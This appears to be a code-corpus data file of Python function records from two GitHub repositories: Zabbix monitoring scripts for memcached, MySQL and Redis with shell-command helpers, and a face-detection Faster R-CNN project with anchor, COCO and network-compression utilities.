{"docstring": "# sudo\u6743\u9650\uff0c\u5fc5\u987b\u6388\u4e88\n# [root@localhost ~]# tail -n 2 /etc/sudoers\n# Defaults:zabbix   !requiretty \n# zabbix ALL=(root) NOPASSWD:/bin/netstat\n\n", "func_signal": "def get_port_list(self):\n", "code": "cmdstr = \"sudo netstat  -nlpt | grep 'memcached' | awk '{print $4}'|awk -F: '{print $2}'\"\nport_conf = None\nc2 = cmds(cmdstr, timeout=3)\nstdo = c2.stdo()\nstde = c2.stde()\nretcode = c2.code()\n\n(stdo_list, stde_list) = (re.split(\"\\n\", stdo), re.split(\"\\n\", stde))\n\nlogdict = {\n    \"cmdstr\": cmdstr,\n    \"stdo\": stdo,\n    \"stde\": stde,\n    \"retcode\": retcode,\n    \"orders\": [\"cmdstr\", \"stdo\", \"stde\", \"retcode\"],\n}\n\nif retcode !=0:\n        self._logger.dictlog(width=8, level=\"error\", **logdict)\n        return port_conf\nelse:\n    self._logger.dictlog(width=8, level=\"info\", **logdict)\n    \ndata = list()\nfor port in stdo_list:\n    if not port:continue\n    port = int(str(port).strip())\n    data.append({\"{#MEMCACHED_PORT}\": port})\nimport json\nreturn json.dumps({'data': data}, sort_keys=True, indent=7, separators=(\",\",\":\"))", "path": "All In One\\src\\memcache.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n\u4e3b\u4ece\u590d\u5236\u5ef6\u65f6\n'''\n", "func_signal": "def get_repl_delay_time(self):\n", "code": "key = 'Seconds_Behind_Master'\nval = self.get_item_tval(key)\nif str(val).lower().strip() == \"null\":\n    val = -1  #\u4e3b\u4ece\u540c\u6b65\u5df2\u65ad\u5f00\nreturn val", "path": "All In One\\src\\mysql_all.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\n\u53c2\u6570\uff1a\n\"\"\"\n# cmdstr = \"redis-cli -h 127.0.0.1 -p 6379 info | grep 'used_cpu_sys' \"\n", "func_signal": "def get_item(self,  key, port=None, password=None):\n", "code": "port = port if port else self._port\npassword = password if password else self._password\n\nif self._force == True:\n    content = self.get_res_set(key, password=password, port=port)\n    self._file_cache.save_to_cache_file(content)\n    return content.get(key, None)\n\n(value, code) = self._file_cache.get_val_from_json(key)\nlogdict = {\n    \"msg\": \"Try To Get From Cache File: %s\" % self._file_cache_path,\n    \"key\": key,\n    \"value\": value,\n    \"orders\": [\"msg\", \"key\", \"value\"],\n}\nself._logger.dictlog(width=8, level=\"info\", **logdict)\nif code == 0: return value\nif code in [1, 2]: ## \u8d85\u65f6\uff0c\u6216\u5f02\u5e38\u6216\u6587\u4ef6\u4e0d\u5b58\u5728\n    content = self.get_res_set(key, password=password, port=port)\n    self._file_cache.save_to_cache_file(content)\n    (value, code) = self._file_cache.get_val_from_json(key)\n    return value\nreturn None", "path": "All In One\\src\\redis.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n\u529f\u80fd\uff1a\n        \u6267\u884c\u547d\u4ee4\n\u53c2\u6570\uff1acommand\uff0c\u547d\u4ee4\u4ee5\u53ca\u5176\u53c2\u6570/\u9009\u9879\n        timeout\uff0c\u547d\u4ee4\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u79d2\n        debug\uff0c\u662f\u5426debug\uff0cTrue\u8f93\u51fadebug\u4fe1\u606f\uff0cFalse\u4e0d\u8f93\u51fa\n        raw\uff0c\u547d\u4ee4\u8f93\u51fa\u662f\u5426\u4e3a\u5143\u7d20\u7684\u8f93\u51fa\uff0cTrue\u662f\uff0cFalse\u4f1a\u5c06\u7ed3\u679c\u7684\u6bcf\u4e00\u884c\u53bb\u9664\u7a7a\u683c\u3001\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u7b49\uff0c\u9ed8\u8ba4False\n\u8fd4\u56de\uff1a\n        \u542b\u67093\u4e2a\u5143\u7d20\u7684\u5143\u7ec4\uff0c\u524d\u4e24\u4e2a\u5143\u7d20\u7c7b\u578b\u662flist\uff0c\u7b2c\u4e09\u4e2a\u5143\u7d20\u7c7b\u578b\u662fint\uff0c\u7b2c\u4e00\u4e2alist\u5b58\u50a8stdout\u7684\u8f93\u51fa\uff0c\u7b2c\u4e8c\u4e2alist\u5b58\u50a8stderr\u7684\u8f93\u51fa\uff0c\u7b2c\u4e09int\u5b58\u50a8\u547d\u4ee4\u6267\u884c\u7684\u8fd4\u56de\u7801\uff0c\u5176\u4e2d-1\u8868\u793a\u547d\u4ee4\u6267\u884c\u8d85\u65f6\n\u793a\u4f8b\uff1a\n        cmd.docmd(\"ls -alt\")\n'''\n", "func_signal": "def docmd_ex(command,timeout=300, debug=False, raw=False, pure=True):\n", "code": "import subprocess, datetime, os, time, signal\nstart = datetime.datetime.now()\n(stdo,stde, retcode) = ([], [], -1)\nps = None\nif platform.system() == \"Linux\":\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\nelse:\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)\nwhile ps.poll() is None:\n        time.sleep(0.2)\n        now = datetime.datetime.now()\n        if (now - start).seconds > timeout:\n                os.kill(ps.pid, signal.SIGINT)\n                return None,None,-1\n                    \nif pure == True:\n    stdo = ps.stdout.read()\n    stde = ps.stderr.read()\nelif pure == False:\n    stdo = ps.stdout.readlines()\n    stde = ps.stderr.readlines()\n    \nretcode = ps.returncode\n\nif raw == True and pure == False:  #\u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\n        stdo = [line.strip(\"\\n\") for line in stdo]\n        stde = [line.strip(\"\\n\") for line in stde]\n\nif raw == False and pure == False: #\u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\uff0c\u5236\u8868\u7b26\u3001\u7a7a\u683c\u7b49\n        stdo = [str.strip(line) for line in stdo]\n        stde = [str.strip(line) for line in stde]\n\t\t\t\t\nreturn stdo,stde,retcode", "path": "MySQL\\scripts\\qiueer\\QCmd.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"Given a command, mode, and a PATH string, return the path which\nconforms to the given mode on the PATH, or None if there is no such\nfile.\n    \n`mode` defaults to os.F_OK | os.X_OK. `path` defaults to the result\nof os.environ.get(\"PATH\"), or can be overridden with a custom search\npath.\n    \n\"\"\"\n", "func_signal": "def which(cmd, mode=os.F_OK | os.X_OK, path=None):\n", "code": "def _access_check(fn, mode):\n    return (os.path.exists(fn) and os.access(fn, mode)\n            and not os.path.isdir(fn))\n\nif os.path.dirname(cmd):\n    if _access_check(cmd, mode):\n        return cmd\n    return None\n    \nif path is None:\n    path = os.environ.get(\"PATH\", os.defpath)\nif not path:\n    return None\npath = path.split(os.pathsep)\n    \nif sys.platform == \"win32\":\n    if not os.curdir in path:\n        path.insert(0, os.curdir)\n    \n    pathext = os.environ.get(\"PATHEXT\", \"\").split(os.pathsep)\n    if any(cmd.lower().endswith(ext.lower()) for ext in pathext):\n        files = [cmd]\n    else:\n        files = [cmd + ext for ext in pathext]\nelse:\n    # On other platforms you don't have things like PATHEXT to tell you\n    # what file suffixes are executable, so just pass on cmd as-is.\n    files = [cmd]\n    \nseen = set()\nfor dir in path:\n    normdir = os.path.normcase(dir)\n    if not normdir in seen:\n        seen.add(normdir)\n        for thefile in files:\n            name = os.path.join(dir, thefile)\n            if _access_check(name, mode):\n                return name\nreturn None", "path": "Tomcat\\jvm.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n\u4e3b\u4ece\u590d\u5236\u72b6\u6001\uff0c\u8fd4\u56de\u503c\uff0c2\u6b63\u5e38\uff0c\u5176\u4ed6\u5f02\u5e38\n'''\n", "func_signal": "def check_replication(self):\n", "code": "item1 = 'Slave_IO_Running'\nitem2 = 'Slave_SQL_Running'\nv1 = self.get_item_tval(item1)\nv2 = self.get_item_tval(item2)\ntotal = 0\nif str(v1).lower().strip() == \"yes\":\n    total += 1\nif str(v2).lower().strip() == \"yes\":\n    total += 1\nreturn total", "path": "All In One\\src\\mysql_all.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nkey Buffer \u547d\u4e2d\u7387  -- \u8bfb\n\"\"\"\n", "func_signal": "def get_keybuf_read_hit_rate(self):\n", "code": "key_reads = self.get_item_tval(\"key_reads\")\nkey_read_requests = self.get_item_tval(\"key_read_requests\")\n\nif key_read_requests == 0:\n    return 100.0\n\nhitrate = \"%.2f\" % ((1 - key_reads/float(key_read_requests))*100)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\ncache\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u884c\u662f\u65f6\u95f4\u6233\uff0c\u7b2c\u4e8c\u884c\u662f\u5185\u5bb9\n\"\"\"\n", "func_signal": "def get_result_dict_from_cache(self, seconds=60):\n", "code": "if os.path.exists(self._cache_file) == False:\n    return None\nresobj = None\nwith open(self._cache_file, \"r\") as fd:\n    alllines = fd.readlines()\n    fd.close()\n    if alllines and len(alllines)>1:\n        old_unixtime = int(str(alllines[0]).strip())\n        now_unixtime = int(time.time())\n        if (now_unixtime - old_unixtime) <= seconds: ## 1min\u5185\n            resobj = str(alllines[1]).strip()\n            resobj = json.loads(resobj)\nreturn resobj", "path": "All In One\\src\\memcache.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nInnodb Buffer \u547d\u4e2d\u7387  -- \u5199\n\"\"\"\n", "func_signal": "def get_innodbbuf_read_hit_rate(self):\n", "code": "innodb_buffer_pool_reads = self.get_item_tval(\"innodb_buffer_pool_reads\")\ninnodb_buffer_pool_read_requests = self.get_item_tval(\"innodb_buffer_pool_read_requests\")\n\nif innodb_buffer_pool_read_requests == 0:\n    return 100.0\n\nhitrate = \"%.2f\" % ((1 - innodb_buffer_pool_reads/float(innodb_buffer_pool_read_requests))*100)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nThread Cache\u547d\u4e2d\u7387\n\"\"\"\n", "func_signal": "def get_thread_cache_hit_rate(self):\n", "code": "Threads_created = self.get_item_tval(\"Threads_created\")\nConnections = self.get_item_tval( \"Connections\")\n\nif Connections == 0:\n    return 100.0\n\nhitrate = \"%.2f\" % ((1-Threads_created/float(Connections))*100)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nTable_locks_waited/Table_locks_immediate=0.3%  \u5982\u679c\u8fd9\u4e2a\u6bd4\u503c\u6bd4\u8f83\u5927\u7684\u8bdd\uff0c\u8bf4\u660e\u8868\u9501\u9020\u6210\u7684\u963b\u585e\u6bd4\u8f83\u4e25\u91cd \n\"\"\"\n", "func_signal": "def get_lock_scale(self):\n", "code": "Table_locks_waited = self.get_item_tval(\"Table_locks_waited\")\nTable_locks_immediate = self.get_item_tval( \"Table_locks_immediate\")\nif Table_locks_immediate == 0:\n    return 100.0\nhitrate = Table_locks_waited/float(Table_locks_immediate)*100\nhitrate = \"%.2f\" % (hitrate)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n\u529f\u80fd\uff1a\n        \u6267\u884c\u547d\u4ee4\n\u53c2\u6570\uff1acommand\uff0c\u547d\u4ee4\u4ee5\u53ca\u5176\u53c2\u6570/\u9009\u9879\n        timeout\uff0c\u547d\u4ee4\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u79d2\n        debug\uff0c\u662f\u5426debug\uff0cTrue\u8f93\u51fadebug\u4fe1\u606f\uff0cFalse\u4e0d\u8f93\u51fa\n        raw\uff0c\u547d\u4ee4\u8f93\u51fa\u662f\u5426\u4e3a\u5143\u7d20\u7684\u8f93\u51fa\uff0cTrue\u662f\uff0cFalse\u4f1a\u5c06\u7ed3\u679c\u7684\u6bcf\u4e00\u884c\u53bb\u9664\u7a7a\u683c\u3001\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u7b49\uff0c\u9ed8\u8ba4False\n\u8fd4\u56de\uff1a\n        \u542b\u67093\u4e2a\u5143\u7d20\u7684\u5143\u7ec4\uff0c\u524d\u4e24\u4e2a\u5143\u7d20\u7c7b\u578b\u662flist\uff0c\u7b2c\u4e09\u4e2a\u5143\u7d20\u7c7b\u578b\u662fint\uff0c\u7b2c\u4e00\u4e2alist\u5b58\u50a8stdout\u7684\u8f93\u51fa\uff0c\u7b2c\u4e8c\u4e2alist\u5b58\u50a8stderr\u7684\u8f93\u51fa\uff0c\u7b2c\u4e09int\u5b58\u50a8\u547d\u4ee4\u6267\u884c\u7684\u8fd4\u56de\u7801\uff0c\u5176\u4e2d-1\u8868\u793a\u547d\u4ee4\u6267\u884c\u8d85\u65f6\n\u793a\u4f8b\uff1a\n        cmd.docmd(\"ls -alt\")\n'''\n", "func_signal": "def docmd(command,timeout=300, debug=False, raw=False):\n", "code": "import subprocess, datetime, os, time, signal\nstart = datetime.datetime.now()\n\nps = None\nretcode = 0\nif platform.system() == \"Linux\":\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\nelse:\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)\nwhile ps.poll() is None:\n        time.sleep(0.2)\n        now = datetime.datetime.now()\n        if (now - start).seconds > timeout:\n                os.kill(ps.pid, signal.SIGINT)\n                retcode = -1\n                return (None,None,retcode)\nstdo = ps.stdout.readlines()\nstde = ps.stderr.readlines()\n\nif not ps.returncode:\n        retcode = ps.returncode\n\nif raw == True:  #\u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\n        stdo = [line.strip(\"\\n\") for line in stdo]\n        stde = [line.strip(\"\\n\") for line in stde]\n\nif raw == False: #\u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\uff0c\u5236\u8868\u7b26\u3001\u7a7a\u683c\u7b49\n        stdo = [str.strip(line) for line in stdo]\n        stde = [str.strip(line) for line in stde]\nreturn (stdo,stde,retcode)", "path": "MySQL\\scripts\\qiueer\\QCmd.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n'''\n", "func_signal": "def docmd(command, timeout=300, raw=False):\n", "code": "import subprocess, datetime, os, time, signal\nstart = datetime.datetime.now()\n\nps = None\nretcode = 0\nif platform.system() == \"Linux\":\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\nelse:\n        ps = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)\nwhile ps.poll() is None:\n        time.sleep(0.2)\n        now = datetime.datetime.now()\n        if (now - start).seconds > timeout:\n                os.kill(ps.pid, signal.SIGINT)\n                retcode = -1\n                return (None, None, retcode)\nstdo = ps.stdout.readlines()\nstde = ps.stderr.readlines()\n\nif not ps.returncode:\n        retcode = ps.returncode\n\nif raw == True:  # \u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\n        stdo = [line.strip(\"\\n\") for line in stdo]\n        stde = [line.strip(\"\\n\") for line in stde]\n\nif raw == False:  # \u53bb\u9664\u884c\u672b\u6362\u884c\u7b26\uff0c\u5236\u8868\u7b26\u3001\u7a7a\u683c\u7b49\n        stdo = [str.strip(line) for line in stdo]\n        stde = [str.strip(line) for line in stde]\n\nreturn (stdo, stde, retcode)", "path": "Tomcat\\jvm.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nCreated_tmp_disk_tables/Created_tmp_tables\u6bd4\u503c\u6700\u597d\u4e0d\u8981\u8d85\u8fc710%\uff0c\u5982\u679cCreated_tmp_tables\u503c\u6bd4\u8f83\u5927\uff0c \u53ef\u80fd\u662f\u6392\u5e8f\u53e5\u5b50\u8fc7\u591a\u6216\u8005\u662f\u8fde\u63a5\u53e5\u5b50\u4e0d\u591f\u4f18\u5316\n\"\"\"\n", "func_signal": "def get_table_scale(self):\n", "code": "Created_tmp_disk_tables = self.get_item_tval(\"Created_tmp_disk_tables\")\nCreated_tmp_tables = self.get_item_tval( \"Created_tmp_tables\")\nif Created_tmp_tables == 0:\n    return 100.0\nhitrate = Created_tmp_disk_tables/float(Created_tmp_tables)*100\nhitrate = \"%.2f\" % (hitrate)\nreturn float(hitrate)", "path": "All In One\\src\\mysql_perf.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\u5224\u65ad\u4e00\u4e2aunicode\u662f\u5426\u662f\u6c49\u5b57\"\"\"\n", "func_signal": "def _is_chinese(self, uchar):\n", "code": "if uchar >= u'\\u4e00' and uchar <= u'\\u9fa5':\n    return True\nelse:\n    return False", "path": "All In One\\src\\qiueer\\python\\slog.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "'''\n\u529f\u80fd\uff1a\u6267\u884c\u591a\u4e2a\u547d\u4ee4\uff0c\u6bcf\u4e2a\u547d\u4ee4\u4e4b\u95f4\u7528 , \u6216 ; \u53f7\u5206\u5272\n\u8fd4\u56de\uff1a\u54c8\u5e0c\uff0ckey\u4e3a\u6bcf\u4e2a\u547d\u4ee4\uff0ckey\u5bf9\u5e94\u7684value\u4e3a\u4e00\u5143\u7ec4\uff0c\u5143\u7ec4\u503c\u8bf7\u53c2\u770bdocmd\u7684\u8bf4\u660e  \n'''\n", "func_signal": "def docmds(commands,timeout=300, debug=False, raw=False):\n", "code": "cmds = re.split('[,;]+' ,  commands)\nresult = {}\nfor cmdline in cmds:\n        (stdo,stde,retcode) = docmd(cmdline, timeout, debug=debug, raw=raw)\n        result[cmdline] = (stdo,stde,retcode)\nreturn result", "path": "MySQL\\scripts\\qiueer\\QCmd.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\ncache\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u7b2c\u4e00\u884c\u662f\u65f6\u95f4\u6233\uff0c\u7b2c\u4e8c\u884c\u662fjson\u6570\u636e\u5185\u5bb9\nreturn: (value, code)\n    code: \n        0: \u6b63\u5e38\u83b7\u53d6\u6570\u636e\n        1: \u5f02\u5e38\n        2: \u8d85\u65f6\n\"\"\"\n", "func_signal": "def get_val_from_json(self, key, seconds=60):\n", "code": "if os.path.exists(self._cache_file) == False:\n    return (None, 1)\n\nfd = open(self._cache_file, \"r\")\nalllines = fd.readlines()\nfd.close()\n\nif not alllines or len(alllines) < 1: return (None, 1)\nold_unixtime = int(str(alllines[0]).strip())\nnow_unixtime = int(time.time())\n## \u8d85\u8fc760s\nif (now_unixtime - old_unixtime) > seconds:\n    return (None, 2)\nresobj = str(alllines[1]).strip()\nresobj = json.loads(resobj)\n\nkeys = re.split(r\"\\.\", key)\ndict_or_val = resobj\nfor k in keys:\n    k = str(k).strip()\n    if type(dict_or_val) != types.DictType: return (dict_or_val, 0)\n    dict_or_val = dict_or_val.get(k, None)\nreturn (dict_or_val, 0)", "path": "All In One\\src\\qiueer\\python\\filecache.py", "repo_name": "qiueer/zabbix", "stars": 433, "license": "None", "language": "python", "size": 734}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Test a Fast R-CNN network')\nparser.add_argument('--gpu', dest='gpu_id', help='GPU id to use',\n                    default=0, type=int)\nparser.add_argument('--def', dest='prototxt',\n                    help='prototxt file defining the network',\n                    default=None, type=str)\nparser.add_argument('--net', dest='caffemodel',\n                    help='model to test',\n                    default=None, type=str)\nparser.add_argument('--cfg', dest='cfg_file',\n                    help='optional config file', default=None, type=str)\nparser.add_argument('--wait', dest='wait',\n                    help='wait until net file exists',\n                    default=True, type=bool)\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to test',\n                    default='voc_2007_test', type=str)\nparser.add_argument('--set', dest='set_cfgs',\n                    help='set config keys', default=None,\n                    nargs=argparse.REMAINDER)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "tools\\rpn_generate.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"inject deep into distutils to customize how the dispatch\nto gcc/nvcc works.\n\nIf you subclass UnixCCompiler, it's not trivial to get your subclass\ninjected in, and still have the right customizations (i.e.\ndistutils.sysconfig.customize_compiler) run on it. So instead of going\nthe OO route, I have this. Note, it's kindof like a wierd functional\nsubclassing going on.\"\"\"\n\n# tell the compiler it can processes .cu\n", "func_signal": "def customize_compiler_for_nvcc(self):\n", "code": "self.src_extensions.append('.cu')\n\n# save references to the default compiler_so and _comple methods\ndefault_compiler_so = self.compiler_so\nsuper = self._compile\n\n# now redefine the _compile method. This gets executed for each\n# object but distutils doesn't have the ability to change compilers\n# based on source extension: we add it.\ndef _compile(obj, src, ext, cc_args, extra_postargs, pp_opts):\n    if os.path.splitext(src)[1] == '.cu':\n        # use the cuda for .cu files\n        self.set_executable('compiler_so', CUDA['nvcc'])\n        # use only a subset of the extra_postargs, which are 1-1 translated\n        # from the extra_compile_args in the Extension class\n        postargs = extra_postargs['nvcc']\n    else:\n        postargs = extra_postargs['gcc']\n\n    super(obj, src, ext, cc_args, postargs, pp_opts)\n    # reset the default compiler_so, which we might have changed for cuda\n    self.compiler_so = default_compiler_so\n\n# inject our redefined _compile method into the class\nself._compile = _compile", "path": "lib\\setup.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"Compress the weight matrix W of an inner product (fully connected) layer\nusing truncated SVD.\n\nParameters:\nW: N x M weights matrix\nl: number of singular values to retain\n\nReturns:\nUl, L: matrices such that W \\approx Ul*L\n\"\"\"\n\n# numpy doesn't seem to have a fast truncated SVD algorithm...\n# this could be faster\n", "func_signal": "def compress_weights(W, l):\n", "code": "U, s, V = np.linalg.svd(W, full_matrices=False)\n\nUl = U[:, :l]\nsl = s[:l]\nVl = V[:l, :]\n\nL = np.dot(np.diag(sl), Vl)\nreturn Ul, L", "path": "tools\\compress_net.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying img\n:return: imgs (object array) : loaded img objects\n\"\"\"\n", "func_signal": "def loadImgs(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.imgs[id] for id in ids]\nelif type(ids) == int:\n    return [self.imgs[ids]]", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nReturn width, height, x center, and y center for an anchor (window).\n\"\"\"\n\n", "func_signal": "def _whctrs(anchor):\n", "code": "w = anchor[2] - anchor[0] + 1\nh = anchor[3] - anchor[1] + 1\nx_ctr = anchor[0] + 0.5 * (w - 1)\ny_ctr = anchor[1] + 0.5 * (h - 1)\nreturn w, h, x_ctr, y_ctr", "path": "lib\\rpn\\generate_anchors.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nLoad cats with the specified ids.\n:param ids (int array)       : integer ids specifying cats\n:return: cats (object array) : loaded cat objects\n\"\"\"\n", "func_signal": "def loadCats(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.cats[id] for id in ids]\nelif type(ids) == int:\n    return [self.cats[ids]]", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nfiltering parameters. default skips that filter.\n:param catNms (str array)  : get cats for given cat names\n:param supNms (str array)  : get cats for given supercategory names\n:param catIds (int array)  : get cats for given cat ids\n:return: ids (int array)   : integer array of cat ids\n\"\"\"\n", "func_signal": "def getCatIds(self, catNms=[], supNms=[], catIds=[]):\n", "code": "catNms = catNms if type(catNms) == list else [catNms]\nsupNms = supNms if type(supNms) == list else [supNms]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(catNms) == len(supNms) == len(catIds) == 0:\n    cats = self.dataset['categories']\nelse:\n    cats = self.dataset['categories']\n    cats = cats if len(catNms) == 0 else [cat for cat in cats if cat['name']          in catNms]\n    cats = cats if len(supNms) == 0 else [cat for cat in cats if cat['supercategory'] in supNms]\n    cats = cats if len(catIds) == 0 else [cat for cat in cats if cat['id']            in catIds]\nids = [cat['id'] for cat in cats]\nreturn ids", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "# (1, 3, 1, 1) shaped arrays\n", "func_signal": "def setup(self, bottom, top):\n", "code": "self.PIXEL_MEANS = \\\n    np.array([[[[0.48462227599918]],\n               [[0.45624044862054]],\n               [[0.40588363755159]]]])\nself.PIXEL_STDS = \\\n    np.array([[[[0.22889466674951]],\n               [[0.22446679341259]],\n               [[0.22495548344775]]]])\n# The default (\"old\") pixel means that were already subtracted\nchannel_swap = (0, 3, 1, 2)\nself.OLD_PIXEL_MEANS = \\\n    cfg.PIXEL_MEANS[np.newaxis, :, :, :].transpose(channel_swap)\n\ntop[0].reshape(*(bottom[0].shape))", "path": "lib\\transform\\torch_image_transform_layer.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "'''\nGet img ids that satisfy given filter conditions.\n:param imgIds (int array) : get imgs for given ids\n:param catIds (int array) : get imgs with all given cats\n:return: ids (int array)  : integer array of img ids\n'''\n", "func_signal": "def getImgIds(self, imgIds=[], catIds=[]):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == 0:\n    ids = self.imgs.keys()\nelse:\n    ids = set(imgIds)\n    for i, catId in enumerate(catIds):\n        if i == 0 and len(ids) == 0:\n            ids = set(self.catToImgs[catId])\n        else:\n            ids &= set(self.catToImgs[catId])\nreturn list(ids)", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nGiven a vector of widths (ws) and heights (hs) around a center\n(x_ctr, y_ctr), output a set of anchors (windows).\n\"\"\"\n\n", "func_signal": "def _mkanchors(ws, hs, x_ctr, y_ctr):\n", "code": "ws = ws[:, np.newaxis]\nhs = hs[:, np.newaxis]\nanchors = np.hstack((x_ctr - 0.5 * (ws - 1),\n                     y_ctr - 0.5 * (hs - 1),\n                     x_ctr + 0.5 * (ws - 1),\n                     y_ctr + 0.5 * (hs - 1)))\nreturn anchors", "path": "lib\\rpn\\generate_anchors.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nLoad anns with the specified ids.\n:param ids (int array)       : integer ids specifying anns\n:return: anns (object array) : loaded ann objects\n\"\"\"\n", "func_signal": "def loadAnns(self, ids=[]):\n", "code": "if type(ids) == list:\n    return [self.anns[id] for id in ids]\nelif type(ids) == int:\n    return [self.anns[ids]]", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
{"docstring": "\"\"\"\nGet ann ids that satisfy given filter conditions. default skips that filter\n:param imgIds  (int array)     : get anns for given imgs\n       catIds  (int array)     : get anns for given cats\n       areaRng (float array)   : get anns for given area range (e.g. [0 inf])\n       iscrowd (boolean)       : get anns for given crowd label (False or True)\n:return: ids (int array)       : integer array of ann ids\n\"\"\"\n", "func_signal": "def getAnnIds(self, imgIds=[], catIds=[], areaRng=[], iscrowd=None):\n", "code": "imgIds = imgIds if type(imgIds) == list else [imgIds]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(imgIds) == len(catIds) == len(areaRng) == 0:\n    anns = self.dataset['annotations']\nelse:\n    if not len(imgIds) == 0:\n        # this can be changed by defaultdict\n        lists = [self.imgToAnns[imgId] for imgId in imgIds if imgId in self.imgToAnns]\n        anns = list(itertools.chain.from_iterable(lists))\n    else:\n        anns = self.dataset['annotations']\n    anns = anns if len(catIds)  == 0 else [ann for ann in anns if ann['category_id'] in catIds]\n    anns = anns if len(areaRng) == 0 else [ann for ann in anns if ann['area'] > areaRng[0] and ann['area'] < areaRng[1]]\nif not iscrowd == None:\n    ids = [ann['id'] for ann in anns if ann['iscrowd'] == iscrowd]\nelse:\n    ids = [ann['id'] for ann in anns]\nreturn ids", "path": "lib\\pycocotools\\coco.py", "repo_name": "playerkk/face-py-faster-rcnn", "stars": 378, "license": "mit", "language": "python", "size": 631}
